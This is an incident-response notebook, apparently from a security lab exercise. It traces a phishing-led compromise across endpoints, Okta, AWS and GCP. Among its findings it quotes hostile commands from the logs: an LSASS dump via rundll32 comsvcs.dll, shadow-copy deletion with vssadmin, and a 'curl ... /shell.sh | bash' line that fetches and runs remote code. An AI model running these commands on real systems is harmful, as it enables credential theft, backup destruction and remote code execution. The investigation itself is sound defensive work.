# Investigation Log

Working notebook. Hypotheses are marked as such and are not treated as facts
until confirmed by evidence.

## Findings

| Time (UTC) | Source | Entity | Finding | Interpretation | Evidence |
|---|---|---|---|---|---|
| 2026-10-28 07:19 | SecurityIncident | Endpoint (TBD) | #324 "NRT Security Event log cleared" | Possible anti-forensics on a Windows host | `queries/01-incidents.kql` |
| 2026-10-28 07:21 | SecurityIncident | AWS trail (TBD) | #325 "AWS CloudTrail logging stopped on established trail" | Possible defense evasion in AWS | `queries/01-incidents.kql` |
| 2026-10-28 07:34 | SecurityIncident | Endpoint (TBD) | #326 Multi-stage incident, privilege escalation, 10 alerts | Largest lab incident, likely the core of the case | `queries/01-incidents.kql` |
| 2026-10-28 08:09 | SecurityIncident | Endpoints (TBD) | #328–333 "Lab Stage 2 - Malicious payload execution detected (CrowdStrike)" | Payload executed, possibly on several hosts | `queries/01-incidents.kql` |
| 2026-10-28 15:40 | SecurityIncident | User (TBD) | #334 Multi-stage incident involving one user; #335–336 suspicious AWS CLI commands | Possible cloud activity with a compromised identity | `queries/01-incidents.kql` |
| Ingestion time | SecurityAlert (MailGuard) | mirage@pkwork.onmicrosoft.com | Phishing email delivered; phishing campaign bypassed MailGuard365 | Possible initial access vector | `queries/02-lab-alerts.kql` |
| Ingestion time | SecurityAlert (CrowdStrike) | win11a + 5 other alerts (hosts TBD) | Malicious payload execution (6 alerts), persistence (T1547) and C2 activity on win11a | win11a is likely compromised | `queries/02-lab-alerts.kql` |
| Ingestion time | SecurityAlert (Palo Alto) | win11a, external IP (TBD) | Internal port scan, C2 beaconing from win11a, large data exfiltration | Possible lateral discovery and data theft | `queries/02-lab-alerts.kql` |
| Ingestion time | SecurityAlert (Okta) | mirage@pkwork.onmicrosoft.com, RU | Account takeover from RU | Credentials of mirage may have been used by the attacker | `queries/02-lab-alerts.kql` |
| Ingestion time | SecurityAlert (Sentinel) | AWS account (TBD) | AWS CLI recon, CloudTrail logging stopped, AWS Config deletion attempts | Possible cloud defense evasion | `queries/02-lab-alerts.kql` |
| Ingestion time | SecurityAlert entities | mirage; aturner, psharma, spatel, jliu, ceo; win11a–d, it-ws01, dev-ws01; 198.51.100.42 | mirage appears in every lab alert and in the AWS alerts; payload execution alerts cover 6 hosts and 6 accounts; 198.51.100.42 is the source of the CloudTrail and AWS Config actions | Payload may have spread beyond win11a; 198.51.100.42 is a candidate attacker IP | `queries/03-lab-alert-entities.kql` |
| 2026-02-06/06-02 14:46 | CrowdStrikeDetections | win11a, mirage, report.exe | First detection: mirage runs `C:\Users\mirage\Downloads\report.exe` | Earliest malicious execution found; downloaded file, consistent with the phishing hypothesis (H1) | `queries/04-crowdstrike-detections.kql` |
| 2026-02-06/06-02 14:51 | CrowdStrikeDetections | win11a, mirage | LSASS dump via `rundll32.exe comsvcs.dll MiniDump` | Credential dumping attempt; success not yet confirmed | `queries/04-crowdstrike-detections.kql` |
| 2026-02-06/06-02 15:18 | CrowdStrikeDetections | win11a, update-service-cdn.xyz | `report.exe --connect update-service-cdn.xyz` | Candidate C2 domain | `queries/04-crowdstrike-detections.kql` |
| 2026-02-06/06-02 17:44–18:37 | CrowdStrikeDetections | srv-file01, srv-dc01, it-ws01, win11b–d, dev-ws01; jliu, spatel, aturner, ceo, psharma | report.exe on 5 more hosts, LSASS dumps on srv-file01 and it-ws01, docx staging to `C:\Temp\staging`, Defender real-time monitoring disabled, `vssadmin delete shadows` incl. on srv-dc01, SMB lateral movement | Activity spread across workstations and servers, including the domain controller; possible ransomware preparation | `queries/04-crowdstrike-detections.kql` |
| Unknown (no time in firewall log) | CommonSecurityLog (Palo Alto) | 10.0.1.50 (win11a) → 192.0.2.100 | 17 allowed sessions on 443 and 53, ~183 MB sent vs ~15 KB received; one THREAT `spyware` alert on 443 | Large outbound transfer to the C2 address seen by CrowdStrike; strong indicator of exfiltration (H3). DNS to an external IP may be tunneling | `queries/05-firewall-flows.kql` |
| Unknown | CommonSecurityLog (Palo Alto) | 10.0.1.50 → 10.0.1.200 | 25 denied connections to common service ports | Internal port scan from win11a (Lab Stage 3.5) | `queries/05-firewall-flows.kql` |
| Unknown | CommonSecurityLog (Palo Alto) | 10.0.1.50 → 198.51.100.42, 203.0.113.77 | Small HTTPS sessions | 198.51.100.42 also appears in AWS alerts; role of 203.0.113.77 unclear | `queries/05-firewall-flows.kql` |
| Unknown (EventStartTime empty) | OktaV2_CL | mirage@pkwork.onmicrosoft.com, 198.51.100.42 (RU, Moscow) | Okta login (WARN) from 198.51.100.42, then: grant super admin role, create API token, deactivate SMS factor of Priya Sharma, reset all MFA factors of CEO PKWork, enroll new TOTP factor "for attacker-controlled device" | Account takeover with privilege escalation and MFA manipulation of psharma and ceo (H2) | `queries/06-okta-events.kql` |
| Unknown | OktaV2_CL | psharma, ceo, aturner, spatel, jliu | Successful logins, MFA and OAuth2 token grants from US IPs that change with every event | No link to the attacker IP; psharma and ceo had MFA changed by mirage | `queries/06-okta-events.kql` |
| — | Correlation | 198.51.100.42 | Same IP in Okta (mirage takeover, RU), AWS alerts (CloudTrail stopped, AWS Config deletion), Palo Alto (HTTPS from win11a) and as external IP of some CrowdStrike detections | Strongest candidate for attacker infrastructure | queries 03, 04, 05, 06 |
| Unknown | MailGuard365_Threats_CL, SEG_MailGuard_CL | mirage; 198.51.100.42; malicious-infra.xyz, pkwork-hr.com; update-service-cdn.xyz | Two emails with report.exe and links to `update-service-cdn.xyz` (payload, download/report.exe) delivered (Action Allow) to mirage from 198.51.100.42 | Likely delivery vector of report.exe executed on win11a at 14:46 (supports H1); sender IP and C2 domain match the attacker infrastructure | `queries/07-mail-threats.kql` |
| Unknown | MailGuard365_Threats_CL | mirage, spatel, ceo, jliu, aturner, psharma; 91.219.236.100, 185.220.101.55; m1crosoft-support.xyz, 0ffice365-security.xyz, pkwork-hr-portal.xyz, sh4repoint-pkwork.xyz | Credential phishing campaign (fake Microsoft and PKWork HR/SharePoint) classified as Phishing but allowed | MailGuard policy did not block detected phishing ("Stage 10 - bypassed MailGuard365"); all recipients may have exposed credentials | `queries/07-mail-threats.kql` |
| Unknown | SEG_MailGuard_CL | mirage → ceo, 10.0.1.50 | Internal "Weekly Status Update" with 2 URLs sent from win11a | Possible internal phishing from the compromised account; URLs not logged | `queries/07-mail-threats.kql` |
| Unknown | SEG_MailGuard_CL, MailGuard365_Threats_CL | psharma, admin | report.exe held (psharma), meeting-notes.docm quarantined (admin) | Blocked attempts; psharma still received an allowed pay stub phishing email | `queries/07-mail-threats.kql` |
| 2026-10-02 11:00 (session start) | AWSCloudTrail | mirage (IAM user), 198.51.100.42 | Console login without MFA, IAM/EC2/KMS discovery | Attacker used mirage's AWS credentials (H4) | `queries/08-aws-cloudtrail.kql` |
| Unknown | AWSCloudTrail | backdoor-svc, AKIAI99ATTACKKEY | mirage created IAM user `backdoor-svc` with AdministratorAccess, access key and console password; backdoor-svc then logged in from 198.51.100.42 and 203.0.113.77 | Persistent admin backdoor in AWS; 203.0.113.77 is also attacker infrastructure (seen in Palo Alto from win11a) | `queries/08-aws-cloudtrail.kql` |
| Unknown | AWSCloudTrail | corp-data-prod | GetObject: `finance/2026-budget-final.xlsx`, `hr/employee-records-full.csv`, `secrets/api-keys-production.json` | Sensitive data and production API keys accessed; keys must be considered compromised | `queries/08-aws-cloudtrail.kql` |
| Unknown | AWSCloudTrail | sg-0a1b2c3d4e5f67890, 5 × p3.16xlarge, i-0a1b2c3d4e5f00001, 185.220.101.55 | Security group opened to 0.0.0.0/0, 5 GPU instances launched, user data `curl https://185.220.101.55/shell.sh \| bash`, instance profile detached | Likely cryptomining / attacker-controlled compute; 185.220.101.55 also sent phishing emails | `queries/08-aws-cloudtrail.kql` |
| Unknown | AWSCloudTrail | management-events-trail | StopLogging and DeleteTrail by mirage | Defense evasion, matches incident #325 | `queries/08-aws-cloudtrail.kql` |
| Unknown | AWSCloudTrail | eve.hacker, 91.219.236.100 | 2 failed console logins | 91.219.236.100 also sent the Microsoft-themed phishing emails | `queries/08-aws-cloudtrail.kql` |
| 2026-10-02 12:00–12:03 | GCPAuditLogs | mirage, 198.51.100.42, backdoor-svc-gcp | Service account `backdoor-svc-gcp` created with a key and `roles/owner` on project pocaas-prod-01 | Persistent owner-level backdoor in GCP, same pattern as AWS `backdoor-svc` | `queries/09-gcp-audit.kql` |
| 2026-10-02 12:03–12:10 | GCPAuditLogs | allow-all-ingress, crypto-miner-01/02/03 | Firewall opened to 0.0.0.0/0; three `a2-highgpu-8g` instances named crypto-miner, the third created by backdoor-svc-gcp | Cryptomining; confirms the backdoor was used | `queries/09-gcp-audit.kql` |
| 2026-10-02 12:05–12:11 | GCPAuditLogs | pocaas-confidential-data | Bucket listed; `financial-report-2026.xlsx`, `employee-pii-export.csv`, `api-keys-production.json` read | Access to confidential data, PII and production API keys | `queries/09-gcp-audit.kql` |
| 2026-10-02 12:07–12:08 | GCPAuditLogs | export-all-logs, _Default sink | Log export sink deleted, default sink disabled | Defense evasion, same as CloudTrail deletion in AWS | `queries/09-gcp-audit.kql` |
| 2026-10-02 12:12 | GCPAuditLogs | deploy-pipeline service account | mirage granted itself `serviceAccountTokenCreator` on deploy-pipeline | Additional persistence / impersonation path | `queries/09-gcp-audit.kql` |
| 2026-10-02 12:09 | GCPAuditLogs | eve.hacker@external-domain.com, 91.219.236.100 | CreateServiceAccount and SetIamPolicy denied | Second actor (also in AWS failed logins and phishing) without access | `queries/09-gcp-audit.kql` |
| 2021-04-26 / 2021-04-28 | AzureActivity_CL, azureActivity_adele_CL | Other tenants (buildseccxpninja, M365x816222) | Demo Azure activity from 2021; mass deletion of resources by AdeleV (37.142.150.162); one yanivsh event with mismatched caller IP 175.45.176.99 | No link to PKWork entities or attacker infrastructure; treated as out of scope unless new evidence appears | `queries/10-azure-activity.kql` |
| 2021-04-28 | OfficeActivity_CL, office_activity_inbox_rule_CL | adelev, johns (M365x816222), 175.45.176.99 | Bulk SharePoint file access, sharing and permission changes, anonymous link, file version deletion and an inbox rule from 175.45.176.99; same IP as the yanivsh anomaly in AzureActivity_CL | Separate 2021 demo scenario in other tenants; no link to PKWork; out of scope | `queries/11-office-activity.kql` |
| Unknown (only ingestion time) | SecurityEvent | win11a, PKWORK\mirage | Event 1102 "The audit log was cleared" by mirage; the only win11a event in SecurityEvent | Anti-forensics on win11a; matches incident #324; earlier Windows logs of win11a are not available | `queries/12-security-event-overview.kql` |
| — | SecurityEvent | Contoso demo hosts | ~18,000 failed logons (4625) on SOC-FW-RDP, SHIR-Hive, SHIR-SAP | Demo environment, not PKWork; out of scope | `queries/12-security-event-overview.kql` |
| 2021-04 | sign_in_adelete_CL, AuditLogsHunting_CL, disable_accounts_CL, model_evasion_detection_CL | Demo tenants | adelev sign-ins from 175.45.176.99; app secrets added; disabled account sign-ins from KP; ML model evasion | Demo data, no link to PKWork; out of scope | `queries/13-identity-misc.kql` |
| 2026-02-06/06-02 | CrowdStrikeHosts | 8 hosts | Host owners: win11a mirage (tag finance), win11b ceo, win11c spatel, win11d psharma, dev-ws01 aturner, it-ws01 jliu; srv-dc01 and srv-file01 are also assigned to jliu | jliu is likely an IT administrator; activity under jliu on the DC and file server fits use of privileged credentials (H5) | `queries/14-crowdstrike-hosts-vulns.kql` |
| — | CrowdStrikeVulnerabilities | it-ws01, srv-file01 | Open CVE-2024-21412 (Internet Shortcut bypass) on it-ws01; CVE-2023-36884 (Office HTML RCE) as exception on srv-file01 | Possible additional entry points; data partly inconsistent (Cisco/PAN-OS CVEs on Windows), low reliability | `queries/14-crowdstrike-hosts-vulns.kql` |

## Hypotheses

| # | Hypothesis | Status | Evidence |
|---|---|---|---|
| H1 | A phishing email to mirage@pkwork.onmicrosoft.com led to payload execution on win11a | Open | Lab alerts S1, 10, 2 |
| H2 | mirage's credentials were used from RU (Okta account takeover) | Open | Lab alert Stage 4 |
| H3 | win11a was used for C2, internal scanning and data exfiltration | Open | Lab alerts 2.5, 3.5, 5, 5.5, 6 |
| H4 | The attacker also acted in AWS and tried to hide activity (CloudTrail, AWS Config, Windows log clearing) | Open | Incidents 324, 325, 334 |
| H5 | Credentials dumped on win11a were used to move to servers (srv-file01, srv-dc01) as jliu | Open | CrowdStrike LSASS dumps, SMB lateral movement |
| H6 | Shadow copy deletion indicates ransomware preparation | Open | `vssadmin delete shadows` on win11a, srv-file01, srv-dc01, dev-ws01 |

Status: Open / Confirmed / Likely / Rejected

## Session status

<!-- Copy this block at the end of each session. -->

### Session 1

**Investigation status:**

Lab data is in workspace `sentinel-lab-main-ws` (ingested 2026-10-28; the
original workspace `sentinellab1786260698` was purged by its 30-day retention).
`TimeGenerated` reflects ingestion, not event time; only CrowdStrike keeps
original timestamps (14:46–18:42 UTC on 2026-02-06 or 2026-06-02; the date is ambiguous), AWS shows a session start
of 2026-10-02 11:00 UTC. The two cannot be reconciled yet.

Working picture (not yet confirmed end to end): mirage received phishing
emails with `report.exe` from 198.51.100.42 that MailGuard allowed; report.exe
ran on win11a, LSASS was dumped and C2 was established to
`update-service-cdn.xyz` / 192.0.2.100, which received ~183 MB from win11a.
The activity spread to five more workstations and to srv-file01 and srv-dc01
(LSASS dumps, docx staging, Defender disabled, shadow copies deleted). From
198.51.100.42 (RU) the attacker took over mirage in Okta (super admin, API
token, MFA changes for psharma and ceo) and in AWS (admin backdoor
`backdoor-svc`, S3 data and API keys accessed, GPU instances, CloudTrail
deleted). A parallel credential phishing campaign (91.219.236.100,
185.220.101.55) reached most users.

**Known scope:**

- Users: mirage (primary), jliu, ceo, psharma, spatel, aturner; AWS: mirage, backdoor-svc
- Hosts: win11a (10.0.1.50, primary), win11b, win11c, win11d, it-ws01, dev-ws01, srv-file01 (10.0.0.20), srv-dc01 (10.0.0.10)
- IP addresses: 198.51.100.42, 192.0.2.100, 203.0.113.77, 185.220.101.55, 91.219.236.100
- Domains: update-service-cdn.xyz, malicious-infra.xyz, pkwork-hr.com, pkwork-hr-portal.xyz, sh4repoint-pkwork.xyz, m1crosoft-support.xyz, 0ffice365-security.xyz
- Files: `C:\Users\<user>\Downloads\report.exe` (placeholder hash), `C:\Temp\staging`
- Cloud resources: AWS account 123456789012 — IAM user backdoor-svc, key AKIAI99ATTACKKEY, S3 corp-data-prod, sg-0a1b2c3d4e5f67890, 5 × p3.16xlarge, management-events-trail; Okta tenant (mirage super admin, API token)

**Open questions:**

- Real event times outside CrowdStrike; order of email delivery, Okta takeover and AWS activity.
- How the attacker obtained mirage's Okta and AWS credentials (phishing link, LSASS dump, or both).
- Did the other users who received allowed phishing enter credentials or run report.exe on their own?
- What was exfiltrated from win11a, and was any data encrypted (shadow copy deletion)?
- Activity in GCP, Azure, Office 365 and Windows Security Event logs.

**Next steps:**

- GCPAuditLogs, AzureActivity_CL, azureActivity_adele_CL: check for activity from the attacker IPs and accounts.
- OfficeActivity_CL and office_activity_inbox_rule_CL: mailbox access and inbox rules (BEC).
- SecurityEvent: log clearing (1102), logons and lateral movement on win11a, srv-file01, srv-dc01.
- sign_in_adelete_CL, disable_accounts_CL, AuditLogsHunting_CL: identity changes.

### Session 2

**Investigation status:**

All PKWork-related tables have been reviewed. GCP confirms the cloud pattern
seen in AWS and has reliable timestamps: on 2026-10-02 12:00–12:12 UTC mirage,
from 198.51.100.42, created an owner-level backdoor service account
(`backdoor-svc-gcp`), opened the firewall, launched three GPU "crypto-miner"
instances, read confidential data and API keys, and disabled log export. The
AWS session of mirage started at 11:00 on the same day, so the cloud activity
is likely one continuous operation (AWS ~11:00–11:35, GCP 12:00–12:12).
SecurityEvent contains only one PKWork event: audit log cleared on win11a by
mirage. CrowdStrike endpoint activity is dated either 2026-02-06 or 2026-06-02
(ambiguous source format). Host inventory shows jliu owns it-ws01 and is
assigned to srv-dc01 and srv-file01, consistent with privileged IT access.

AzureActivity_CL, azureActivity_adele_CL, OfficeActivity_CL,
office_activity_inbox_rule_CL, sign_in_adelete_CL, disable_accounts_CL,
AuditLogsHunting_CL, model_evasion_detection_CL and all SecurityEvent hosts
other than win11a are 2021 demo data from other tenants (Contoso,
M365x816222, buildseccxpninja) and are out of scope.

**Known scope (changes since Session 1):**

- Cloud resources added: GCP project pocaas-prod-01 — service account backdoor-svc-gcp (owner, key abc123def456), firewall rule allow-all-ingress, instances crypto-miner-01/02/03, bucket pocaas-confidential-data, deleted sink export-all-logs, disabled sink _Default, serviceAccountTokenCreator on deploy-pipeline for mirage
- Accounts added: backdoor-svc-gcp (GCP); eve.hacker@external-domain.com (failed attempts, 91.219.236.100)
- Hosts: no new PKWork hosts

**Open questions:**

- Exact date of the endpoint activity (2026-02-06 or 2026-06-02) and therefore its order relative to the cloud activity on 2026-10-02.
- How mirage's Okta, AWS and GCP credentials were obtained (phishing link, LSASS dump, or both).
- Whether other users who received allowed phishing emails were compromised.
- Volume and content of data exfiltrated from win11a and from AWS S3 / GCP storage.
- Whether encryption followed the shadow copy deletion.

**Next steps:**

- Build the consolidated incident timeline and scope from the log.
- Map the activity to MITRE ATT&CK and rate each conclusion as Confirmed / Likely / Unknown.
- Draft response recommendations tied to the findings.
